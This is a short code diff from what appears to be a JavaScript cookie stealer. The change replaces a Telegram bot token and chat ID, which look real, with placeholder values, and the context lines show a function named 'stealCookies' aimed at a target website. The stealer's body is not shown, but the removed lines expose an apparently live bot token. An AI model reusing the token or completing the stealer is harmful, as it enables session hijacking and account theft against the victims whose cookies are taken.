@@ -8,8 +8,8 @@ document.addEventListener('DOMContentLoaded', () => {
     ];
 
     // Telegram bot details
-    const botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjceyobE";
-    const chatId = "899184398";
+    const botToken = "example";
+    const chatId = "example";
 
     // Function to steal cookies from a target website
     function stealCookies(url) {
